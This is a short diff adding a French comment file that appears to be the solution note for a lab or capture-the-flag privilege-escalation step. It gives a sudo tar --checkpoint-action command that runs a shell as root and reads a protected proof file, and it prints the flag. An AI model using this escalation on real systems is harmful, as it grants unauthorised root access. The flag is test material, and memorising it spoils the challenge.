@@ -1,0 +1,14 @@
+# Host privesc — ops → root (pivot)
+#
+# Après accès ops (SSH), le pivot interne est accessible, mais certaines preuves
+# mission sont scellées (root-only).
+#
+# Indice : sudo -l
+# Résultat attendu : (root) NOPASSWD: /usr/bin/tar
+#
+# Lecture de la preuve :
+#   sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 \
+#     --checkpoint-action='exec=/bin/sh -c "cat /opt/omega/proofs/ROOT.txt"'
+#
+# Preuve : ROOT: OMEGA-PRIV-ROOT-4421
+
